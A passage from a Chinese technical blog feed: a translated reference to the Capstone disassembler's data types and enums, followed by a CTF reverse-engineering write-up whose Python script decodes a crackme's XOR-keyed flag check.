&lt;&lt; <span class="number">1</span>, <span class="comment">///&lt; M680X Hitachi 6301,6303 模式</span></span><br><span class="line">CS_MODE_M680X_6309 = <span class="number">1</span> &lt;&lt; <span class="number">2</span>, <span class="comment">///&lt; M680X Hitachi 6309 模式</span></span><br><span class="line">CS_MODE_M680X_6800 = <span class="number">1</span> &lt;&lt; <span class="number">3</span>, <span class="comment">///&lt; M680X Motorola 6800,6802 模式</span></span><br><span class="line">CS_MODE_M680X_6801 = <span class="number">1</span> &lt;&lt; <span class="number">4</span>, <span class="comment">///&lt; M680X Motorola 6801,6803 模式</span></span><br><span class="line">CS_MODE_M680X_6805 = <span class="number">1</span> &lt;&lt; <span class="number">5</span>, <span class="comment">///&lt; M680X Motorola/Freescale 6805 模式</span></span><br><span class="line">CS_MODE_M680X_6808 = <span class="number">1</span> &lt;&lt; <span class="number">6</span>, <span class="comment">///&lt; M680X Motorola/Freescale/NXP 68HC08 模式</span></span><br><span class="line">CS_MODE_M680X_6809 = <span class="number">1</span> &lt;&lt; <span class="number">7</span>, <span class="comment">///&lt; M680X Motorola 6809 模式</span></span><br><span class="line">CS_MODE_M680X_6811 = <span class="number">1</span> &lt;&lt; <span class="number">8</span>, <span class="comment">///&lt; M680X Motorola/Freescale/NXP 68HC11 模式</span></span><br><span class="line">CS_MODE_M680X_CPU12 = <span class="number">1</span> &lt;&lt; <span class="number">9</span>, <span class="comment">///&lt; M680X Motorola/Freescale/NXP CPU12</span></span><br><span class="line"><span class="comment">///&lt; 用于 M68HC12/HCS12</span></span><br><span class="line">CS_MODE_M680X_HCS08 = <span class="number">1</span> &lt;&lt; <span class="number">10</span>, <span class="comment">///&lt; M680X Freescale/NXP HCS08 模式</span></span><br><span class="line">&#125; cs_mode;</span><br></pre></td></tr></table></figure></div><blockquote><p>用法：API中cs_mode参数填入枚举内容，如API中cs_open(cs_arch arch, cs_mode mode, csh *handle);第二个参数填CS_MODE_64则支持X64模式</p></blockquote><h4 id="cs-opt-mem"><a href="#cs-opt-mem" class="headerlink" title="cs_opt_mem"></a>cs_opt_mem</h4><p>内存操作</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cs_opt_mem</span> &#123;</span></span><br><span class="line"><span class="keyword">cs_malloc_t</span> <span class="built_in">malloc</span>;</span><br><span class="line"><span class="keyword">cs_calloc_t</span> <span class="built_in">calloc</span>;</span><br><span class="line"><span class="keyword">cs_realloc_t</span> <span class="built_in">realloc</span>;</span><br><span class="line"><span class="keyword">cs_free_t</span> <span class="built_in">free</span>;</span><br><span class="line"><span class="keyword">cs_vsnprintf_t</span> vsnprintf;</span><br><span class="line">&#125; cs_opt_mem;</span><br></pre></td></tr></table></figure></div><blockquote><p>用法：可使用用户自定义的malloc/calloc/realloc/free/vsnprintf()函数，默认使用系统自带malloc(), calloc(), realloc(), free() &amp; vsnprintf()</p></blockquote><h4 id="cs-opt-mnem"><a href="#cs-opt-mnem" class="headerlink" title="cs_opt_mnem"></a>cs_opt_mnem</h4><p>自定义助记符</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cs_opt_mnem</span> &#123;</span></span><br><span class="line"><span class="comment">/// 需要自定义的指令ID</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> id;</span><br><span class="line"><span class="comment">/// 自定义的助记符</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *mnemonic;</span><br><span class="line">&#125; cs_opt_mnem;</span><br></pre></td></tr></table></figure></div><h4 id="cs-opt-type"><a href="#cs-opt-type" class="headerlink" title="cs_opt_type"></a>cs_opt_type</h4><p>反编译的运行时选项</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> cs_opt_type &#123;</span><br><span class="line">CS_OPT_INVALID = <span class="number">0</span>,<span class="comment">///&lt; 无特殊要求</span></span><br><span class="line">CS_OPT_SYNTAX,<span class="comment">///&lt; 汇编输出语法</span></span><br><span class="line">CS_OPT_DETAIL,<span class="comment">///&lt; 将指令结构分解为多个细节</span></span><br><span class="line">CS_OPT_MODE,<span class="comment">///&lt; 运行时改变引擎模式</span></span><br><span class="line">CS_OPT_MEM,<span class="comment">///&lt; 用户定义的动态内存相关函数</span></span><br><span class="line">CS_OPT_SKIPDATA, <span class="comment">///&lt; 在反汇编时跳过数据。然后引擎将处于SKIPDATA模式</span></span><br><span class="line">CS_OPT_SKIPDATA_SETUP, <span class="comment">///&lt; 为SKIPDATA选项设置用户定义函数</span></span><br><span class="line">CS_OPT_MNEMONIC, <span class="comment">///&lt;自定义指令助记符</span></span><br><span class="line">CS_OPT_UNSIGNED, <span class="comment">///&lt; 以无符号形式打印立即操作数</span></span><br><span class="line">&#125; cs_opt_type;</span><br></pre></td></tr></table></figure></div><blockquote><p>用法：API cs_option(csh handle, cs_opt_type type, size_t value);中第二个参数</p></blockquote><h4 id="cs-opt-value"><a href="#cs-opt-value" class="headerlink" title="cs_opt_value"></a>cs_opt_value</h4><p>运行时选项值(与cs_opt_type关联)</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> cs_opt_value &#123;</span><br><span class="line">CS_OPT_OFF = <span class="number">0</span>,  <span class="comment">///&lt; 关闭一个选项 - 默认为CS_OPT_DETAIL, CS_OPT_SKIPDATA, CS_OPT_UNSIGNED.</span></span><br><span class="line">CS_OPT_ON = <span class="number">3</span>, <span class="comment">///&lt; 打开一个选项 (CS_OPT_DETAIL, CS_OPT_SKIPDATA).</span></span><br><span class="line">CS_OPT_SYNTAX_DEFAULT = <span class="number">0</span>, <span class="comment">///&lt; 默认asm语法 (CS_OPT_SYNTAX).</span></span><br><span class="line">CS_OPT_SYNTAX_INTEL, <span class="comment">///&lt; X86 Intel asm语法 - 默认开启 X86 (CS_OPT_SYNTAX).</span></span><br><span class="line">CS_OPT_SYNTAX_ATT,   <span class="comment">///&lt; X86 ATT 汇编语法 (CS_OPT_SYNTAX).</span></span><br><span class="line">CS_OPT_SYNTAX_NOREGNAME, <span class="comment">///&lt; 只打印寄存器名和编号 (CS_OPT_SYNTAX)</span></span><br><span class="line">CS_OPT_SYNTAX_MASM, <span class="comment">///&lt; X86 Intel Masm 语法 (CS_OPT_SYNTAX).</span></span><br><span class="line">&#125; cs_opt_value;</span><br></pre></td></tr></table></figure></div><blockquote><p>用法：API cs_option(csh handle, cs_opt_type type, size_t value);中第三个参数</p></blockquote><h4 id="cs-op-type"><a href="#cs-op-type" class="headerlink" title="cs_op_type"></a>cs_op_type</h4><p>通用指令操作数类型，在所有架构中保持一致</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> cs_op_type &#123;</span><br><span class="line">CS_OP_INVALID = <span class="number">0</span>,  <span class="comment">///&lt; 未初始化/无效的操作数</span></span><br><span class="line">CS_OP_REG,          <span class="comment">///&lt; 寄存器操作数</span></span><br><span class="line">CS_OP_IMM,          <span class="comment">///&lt; 立即操作数</span></span><br><span class="line">CS_OP_MEM,          <span class="comment">///&lt; 内存操作数</span></span><br><span class="line">CS_OP_FP,           <span class="comment">///&lt; 浮点数</span></span><br><span class="line">&#125; cs_op_type;</span><br></pre></td></tr></table></figure></div><blockquote><p>目前开放的API中未调用</p></blockquote><h4 id="cs-ac-type"><a href="#cs-ac-type" class="headerlink" title="cs_ac_type"></a>cs_ac_type</h4><p>通用指令操作数访问类型，在所有架构中保持一致<br>可以组合访问类型，例如:CS_AC_READ | CS_AC_WRITE</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> cs_ac_type &#123;</span><br><span class="line">CS_AC_INVALID = <span class="number">0</span>,        <span class="comment">///&lt; 未初始化/无效的访问类型</span></span><br><span class="line">CS_AC_READ    = <span class="number">1</span> &lt;&lt; <span class="number">0</span>,   <span class="comment">///&lt; 操作数从内存或寄存器中读取</span></span><br><span class="line">CS_AC_WRITE   = <span class="number">1</span> &lt;&lt; <span class="number">1</span>,   <span class="comment">///&lt; 操作数从内存或寄存器中写入</span></span><br><span class="line">&#125; cs_ac_type;</span><br></pre></td></tr></table></figure></div><blockquote><p>目前开放的API中未调用</p></blockquote><h4 id="cs-group-type"><a href="#cs-group-type" class="headerlink" title="cs_group_type"></a>cs_group_type</h4><p>公共指令组，在所有架构中保持一致</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">cs_group_type &#123;</span><br><span class="line">CS_GRP_INVALID = <span class="number">0</span>,  <span class="comment">///&lt; 未初始化/无效指令组</span></span><br><span class="line">CS_GRP_JUMP,    <span class="comment">///&lt; 所有跳转指令(条件跳转+直接跳转+间接跳转)</span></span><br><span class="line">CS_GRP_CALL,    <span class="comment">///&lt; 所有调用指令</span></span><br><span class="line">CS_GRP_RET,     <span class="comment">///&lt; 所有返回指令</span></span><br><span class="line">CS_GRP_INT,     <span class="comment">///&lt; 所有中断指令(int+syscall)</span></span><br><span class="line">CS_GRP_IRET,    <span class="comment">///&lt; 所有中断返回指令</span></span><br><span class="line">CS_GRP_PRIVILEGE,    <span class="comment">///&lt; 所有特权指令</span></span><br><span class="line">CS_GRP_BRANCH_RELATIVE, <span class="comment">///&lt; 所有相关分支指令</span></span><br><span class="line">&#125; cs_group_type;</span><br></pre></td></tr></table></figure></div><blockquote><p>目前开放的API中未调用</p></blockquote><h4 id="cs-opt-skipdata"><a href="#cs-opt-skipdata" class="headerlink" title="cs_opt_skipdata"></a>cs_opt_skipdata</h4><p>用户自定义设置SKIPDATA选项</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cs_opt_skipdata</span> &#123;</span></span><br><span class="line"><span class="comment">/// Capstone认为要跳过的数据是特殊的“指令”</span></span><br><span class="line"><span class="comment">/// 用户可以在这里指定该指令的“助记符”字符串</span></span><br><span class="line"><span class="comment">/// 默认情况下(@mnemonic为NULL)， Capstone使用“.byte”</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *mnemonic;</span><br><span class="line"></span><br><span class="line"><span class="comment">/// 用户定义的回调函数，当Capstone命中数据时调用</span></span><br><span class="line"><span class="comment">/// 如果这个回调返回的值是正数(&gt;0)，Capstone将跳过这个字节数并继续。如果回调返回0,Capstone将停止反汇编并立即从cs_disasm()返回</span></span><br><span class="line"><span class="comment">/// 注意:如果这个回调指针为空，Capstone会根据架构跳过一些字节，如下所示:</span></span><br><span class="line"><span class="comment">/// Arm:     2 bytes (Thumb mode) or 4 bytes.</span></span><br><span class="line"><span class="comment">/// Arm64:   4 bytes.</span></span><br><span class="line"><span class="comment">/// Mips:    4 bytes.</span></span><br><span class="line"><span class="comment">/// M680x:   1 byte.</span></span><br><span class="line"><span class="comment">/// PowerPC: 4 bytes.</span></span><br><span class="line"><span class="comment">/// Sparc:   4 bytes.</span></span><br><span class="line"><span class="comment">/// SystemZ: 2 bytes.</span></span><br><span class="line"><span class="comment">/// X86:     1 bytes.</span></span><br><span class="line"><span class="comment">/// XCore:   2 bytes.</span></span><br><span class="line"><span class="comment">/// EVM:     1 bytes.</span></span><br><span class="line"><span class="keyword">cs_skipdata_cb_t</span> callback; <span class="comment">// 默认值为 NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/// 用户自定义数据将被传递给@callback函数指针</span></span><br><span class="line"><span class="keyword">void</span> *user_data;</span><br><span class="line">&#125; cs_opt_skipdata;</span><br></pre></td></tr></table></figure></div><blockquote><p>目前开放的API中未调用</p></blockquote><h4 id="cs-detail"><a href="#cs-detail" class="headerlink" title="cs_detail"></a>cs_detail</h4><p>注意:只有当CS_OPT_DETAIL = CS_OPT_ON时，cs_detail中的所有信息才可用</p><p>在arch/ARCH/ARCHDisassembler.c的ARCH_getInstruction中初始化为memset(., 0, offsetof(cs_detail, ARCH)+sizeof(cs_ARCH))</p><p>如果cs_detail发生了变化，特别是在union之后添加了字段，那么相应地更新arch/ arch/ archdisassembly .c</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cs_detail</span> &#123;</span></span><br><span class="line"><span class="keyword">uint16_t</span> regs_read[<span class="number">12</span>]; <span class="comment">///&lt; 这个参数读取隐式寄存器列表</span></span><br><span class="line"><span class="keyword">uint8_t</span> regs_read_count; <span class="comment">///&lt; 这个参数读取隐式寄存器计数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint16_t</span> regs_write[<span class="number">20</span>]; <span class="comment">///&lt; 这个参数修改隐式寄存器列表</span></span><br><span class="line"><span class="keyword">uint8_t</span> regs_write_count; <span class="comment">///&lt; 这个参数修改隐式寄存器计数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span> groups[<span class="number">8</span>]; <span class="comment">///&lt; 此指令所属的指令组的列表</span></span><br><span class="line"><span class="keyword">uint8_t</span> groups_count; <span class="comment">///&lt; 此指令所属的组的数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/// 特定于体系结构的信息</span></span><br><span class="line"><span class="keyword">union</span> &#123;</span><br><span class="line">cs_x86 x86;     <span class="comment">///&lt; X86 架构, 包括 16-bit, 32-bit &amp; 64-bit 模式</span></span><br><span class="line">cs_arm64 arm64; <span class="comment">///&lt; ARM64 架构 (aka AArch64)</span></span><br><span class="line">cs_arm arm;     <span class="comment">///&lt; ARM 架构 (包括 Thumb/Thumb2)</span></span><br><span class="line">cs_m68k m68k;   <span class="comment">///&lt; M68K 架构</span></span><br><span class="line">cs_mips mips;   <span class="comment">///&lt; MIPS 架构</span></span><br><span class="line">cs_ppc ppc;    <span class="comment">///&lt; PowerPC 架构</span></span><br><span class="line">cs_sparc sparc; <span class="comment">///&lt; Sparc 架构</span></span><br><span class="line">cs_sysz sysz;   <span class="comment">///&lt; SystemZ 架构</span></span><br><span class="line">cs_xcore xcore; <span class="comment">///&lt; XCore 架构</span></span><br><span class="line">cs_tms320c64x tms320c64x;  <span class="comment">///&lt; TMS320C64x 架构</span></span><br><span class="line">cs_m680x m680x; <span class="comment">///&lt; M680X 架构</span></span><br><span class="line">cs_evm evm;    <span class="comment">///&lt; Ethereum 架构</span></span><br><span class="line">&#125;;</span><br><span class="line">&#125; cs_detail;</span><br></pre></td></tr></table></figure></div><h4 id="cs-insn"><a href="#cs-insn" class="headerlink" title="cs_insn"></a>cs_insn</h4><p>指令的详细信息</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cs_insn</span> &#123;</span></span><br><span class="line"><span class="comment">/// 指令ID(基本上是一个用于指令助记符的数字ID)</span></span><br><span class="line"><span class="comment">/// 应在相应架构的头文件中查找'[ARCH]_insn' enum中的指令id，如ARM.h中的'arm_insn'代表ARM, X86.h中的'x86_insn'代表X86等…</span></span><br><span class="line"><span class="comment">/// 即使在CS_OPT_DETAIL = CS_OPT_OFF时也可以使用此信息</span></span><br><span class="line"><span class="comment">/// 注意:在Skipdata模式下，这个id字段的“data”指令为0</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> id;</span><br><span class="line"></span><br><span class="line"><span class="comment">/// 指令地址 (EIP)</span></span><br><span class="line"><span class="comment">/// 即使在CS_OPT_DETAIL = CS_OPT_OFF时也可以使用此信息</span></span><br><span class="line"><span class="keyword">uint64_t</span> address;</span><br><span class="line"></span><br><span class="line"><span class="comment">/// 指令长度</span></span><br><span class="line"><span class="comment">/// 即使在CS_OPT_DETAIL = CS_OPT_OFF时也可以使用此信息</span></span><br><span class="line"><span class="keyword">uint16_t</span> <span class="built_in">size</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/// 此指令的机器码，其字节数由上面的@size表示</span></span><br><span class="line"><span class="comment">/// 即使在CS_OPT_DETAIL = CS_OPT_OFF时也可以使用此信息</span></span><br><span class="line"><span class="keyword">uint8_t</span> bytes[<span class="number">16</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/// 指令的Ascii文本助记符</span></span><br><span class="line"><span class="comment">/// 即使在CS_OPT_DETAIL = CS_OPT_OFF时也可以使用此信息</span></span><br><span class="line"><span class="keyword">char</span> mnemonic[CS_MNEMONIC_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="comment">/// 指令操作数的Ascii文本</span></span><br><span class="line"><span class="comment">/// 即使在CS_OPT_DETAIL = CS_OPT_OFF时也可以使用此信息</span></span><br><span class="line"><span class="keyword">char</span> op_str[<span class="number">160</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/// cs_detail指针</span></span><br><span class="line"><span class="comment">/// 注意:只有同时满足以下两个要求时，detail指针才有效:</span></span><br><span class="line"><span class="comment">/// (1) CS_OP_DETAIL = CS_OPT_ON</span></span><br><span class="line"><span class="comment">/// (2) 引擎未处于Skipdata模式(CS_OP_SKIPDATA选项设置为CS_OPT_ON)</span></span><br><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="comment">/// 注意2:当处于Skipdata模式或detail模式关闭时，即使这个指针不是NULL，它的内容仍然是不相关的。</span></span><br><span class="line">cs_detail *detail;</span><br><span class="line">&#125; cs_insn;</span><br></pre></td></tr></table></figure></div><h4 id="cs-err"><a href="#cs-err" class="headerlink" title="cs_err"></a>cs_err</h4><p>Capstone API遇到的各类型的错误时cs_errno()的返回值</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> cs_err &#123;</span><br><span class="line">CS_ERR_OK = <span class="number">0</span>,   <span class="comment">///&lt; 无错误</span></span><br><span class="line">CS_ERR_MEM,      <span class="comment">///&lt; 内存不足: cs_open(), cs_disasm(), cs_disasm_iter()</span></span><br><span class="line">CS_ERR_ARCH,     <span class="comment">///&lt; 不支持的架构: cs_open()</span></span><br><span class="line">CS_ERR_HANDLE,   <span class="comment">///&lt;句柄不可用: cs_op_count(), cs_op_index()</span></span><br><span class="line">CS_ERR_CSH,      <span class="comment">///&lt; csh参数不可用: cs_close(), cs_errno(), cs_option()</span></span><br><span class="line">CS_ERR_MODE,     <span class="comment">///&lt; 无效的或不支持的模式: cs_open()</span></span><br><span class="line">CS_ERR_OPTION,   <span class="comment">///&lt; 无效的或不支持的选项: cs_option()</span></span><br><span class="line">CS_ERR_DETAIL,   <span class="comment">///&lt; 信息不可用，因为detail选项是关闭的</span></span><br><span class="line">CS_ERR_MEMSETUP, <span class="comment">///&lt; 动态内存管理未初始化(见 CS_OPT_MEM)</span></span><br><span class="line">CS_ERR_VERSION,  <span class="comment">///&lt; 不支持版本 (bindings)</span></span><br><span class="line">CS_ERR_DIET,     <span class="comment">///&lt; 在“diet”引擎中访问不相关的数据</span></span><br><span class="line">CS_ERR_SKIPDATA, <span class="comment">///&lt; 在SKIPDATA模式下访问与“数据”指令无关的数据</span></span><br><span class="line">CS_ERR_X86_ATT,  <span class="comment">///&lt; X86 AT&amp;T 语法不支持(在编译时退出)</span></span><br><span class="line">CS_ERR_X86_INTEL, <span class="comment">///&lt; X86 Intel 语法不支持(在编译时退出)</span></span><br><span class="line">CS_ERR_X86_MASM, <span class="comment">///&lt; X86 Intel 语法不支持(在编译时退出)</span></span><br><span class="line">&#125; cs_err;</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;Capstone反汇编引擎数据类型及API分析及示例-一&quot;&gt;&lt;a href=&quot;#Capstone反汇编引擎数据类型及API分析及示例-一&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="反汇编" scheme="https://kabeor.github.io/tags/%E5%8F%8D%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>SICNU-CTF逆向 Sign</title>
    <link href="https://kabeor.github.io/SICNU-CTF%E9%80%86%E5%90%91%20Sign/"/>
    <id>https://kabeor.github.io/SICNU-CTF%E9%80%86%E5%90%91%20Sign/</id>
    <published>2019-07-25T16:00:00.000Z</published>
    <updated>2020-03-16T04:49:12.758Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SICNU2018-CTF逆向-Sign"><a href="#SICNU2018-CTF逆向-Sign" class="headerlink" title="SICNU2018-CTF逆向 Sign"></a>SICNU2018-CTF逆向 Sign</h1><p>2018年五月川师的比赛题，一直放着没有看，今天清理文件拿出来看一下</p><p>x86,入口jmp一看就是VS编译，无壳无花</p><p>之前一直好奇大佬们是怎样做到秒题的，做完这道才题知道，只有敏锐的洞察力快速定位核心代码才是王道</p><p>main函数<br><a href="https://i.loli.net/2019/07/26/5d3a7c867363016763.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/26/5d3a7c867363016763.jpg" class="lazyload"></a></p><p>很显然有两个判断点<br>第一个直接看赋值v5的函数sub_401186，这道题有意思的点在于每个函数都会有一个二次跳转，因此如果不能及时定位到关键点，在限定的时间内很难分析出来<br><a href="https://i.loli.net/2019/07/26/5d3a7d54bc1be16220.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/26/5d3a7d54bc1be16220.jpg" class="lazyload"></a><br>非常无用的跳转，一直想拿IDC脚本剔除，但可惜没什么思路<br>进入之后<br><a href="https://i.loli.net/2019/07/26/5d3a7d9d8e6f428329.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/26/5d3a7d9d8e6f428329.jpg" class="lazyload"></a></p><p>v8限定字符串长度，开头必须是 ‘SICNU{’  ,算上最后一个一定是‘}’，因此我们还要输入16个字符。<br>动态调试发现下面的判断也只判断了输入前6个字符，然后截断，并没有做其他操作</p><p>回到主函数看到第二个判定在v3，直接进入<br><a href="https://i.loli.net/2019/07/26/5d3a7ecb6d76846189.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/26/5d3a7ecb6d76846189.jpg" class="lazyload"></a><br><a href="https://i.loli.net/2019/07/26/5d3a7ee02379c25978.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/26/5d3a7ee02379c25978.jpg" class="lazyload"></a></p><p>如图，动态调试发现，v1是对{后的输入每次取一字符，然后和key1密钥表异或，共操作六次<br>v2是剩余字符长度，其中除去反括号还有10个字符，这里sub_401230的功能F5识别出错，直接看汇编<br><a href="https://i.loli.net/2019/07/26/5d3a7ffddfe4436075.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/26/5d3a7ffddfe4436075.jpg" class="lazyload"></a><br>rep stosd循环，ecx,11h为循环次数，eax初始0CCCCCCCCh，最后v2为固定值11</p><p>接下来判断是否是数字，是则+17，不是则与key2密钥表异或</p><p>接下来验证答案，要求C1等于key3-v20，C2等于key4-v13，所以写脚本直接反求即可</p><p>python脚本</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a0 = [<span class="number">0xE5</span>, <span class="number">0xA6</span>, <span class="number">0xE4</span>, <span class="number">0xE2</span>, <span class="number">0xD4</span>, <span class="number">0x95</span>, <span class="number">0xEC</span>]</span><br><span class="line">a1 = [ <span class="number">0xFC</span>, <span class="number">0x11</span>, <span class="number">0x41</span>, <span class="number">0xC7</span>, <span class="number">0x66</span>, <span class="number">0x42</span>, <span class="number">0x5D</span>, <span class="number">0x68</span>, <span class="number">0x28</span>, <span class="number">0x3B</span>]</span><br><span class="line">key1 = [<span class="number">0xB2</span>, <span class="number">0xC3</span>, <span class="number">0xD5</span>, <span class="number">0xA1</span>, <span class="number">0xE4</span>, <span class="number">0xF8</span>, <span class="number">0xA9</span>]</span><br><span class="line">key2 = [<span class="number">0xA3</span>, <span class="number">0x45</span>, <span class="number">0xEA</span>, <span class="number">0x35</span>, <span class="number">0x3E</span>, <span class="number">0x26</span>, <span class="number">0x5D</span>, <span class="number">0x46</span>]</span><br><span class="line"></span><br><span class="line">C1 = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">C1[i]=chr(key1[i]^a0[i])</span><br><span class="line"></span><br><span class="line">print(<span class="string">"flag:    SICNU&#123;"</span>, end = <span class="string">''</span>)</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">print(C1[a], end = <span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line">C2 = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">C2[i] = a1[j] - <span class="number">17</span></span><br><span class="line"><span class="keyword">if</span>(C2[i]&gt;=<span class="number">48</span> <span class="keyword">and</span> C2[i]&lt;=<span class="number">57</span>):</span><br><span class="line">C2[i] = chr(C2[i])</span><br><span class="line">i=i+<span class="number">1</span></span><br><span class="line">j=j+<span class="number">1</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">C2[i] = chr(key2[k] ^ a1[j])</span><br><span class="line">i=i+<span class="number">1</span></span><br><span class="line">j=j+<span class="number">1</span></span><br><span class="line">k=k+<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">print(C2[a], end = <span class="string">''</span>)</span><br></pre></td></tr></table></figure></div><p>flag<br><a href="https://i.loli.net/2019/07/26/5d3a8138d970b13890.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/26/5d3a8138d970b13890.jpg" class="lazyload"></a></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;SICNU2018-CTF逆向-Sign&quot;&gt;&lt;a href=&quot;#SICNU2018-CTF逆向-Sign&quot; class=&quot;headerlink&quot; title=&quot;SICNU2018-CTF逆向 Sign&quot;&gt;&lt;/a&gt;SICNU2018-CTF逆向</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="逆向， CTF" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91%EF%BC%8C-CTF/"/>
    
  </entry>
  
  <entry>
    <title>(Sequence List)顺序表算法分析</title>
    <link href="https://kabeor.github.io/(Sequence%20List)%E9%A1%BA%E5%BA%8F%E8%A1%A8%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90/"/>
    <id>https://kabeor.github.io/(Sequence%20List)%E9%A1%BA%E5%BA%8F%E8%A1%A8%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90/</id>
    <published>2019-04-23T16:00:00.000Z</published>
    <updated>2020-03-16T04:18:57.505Z</updated>
    
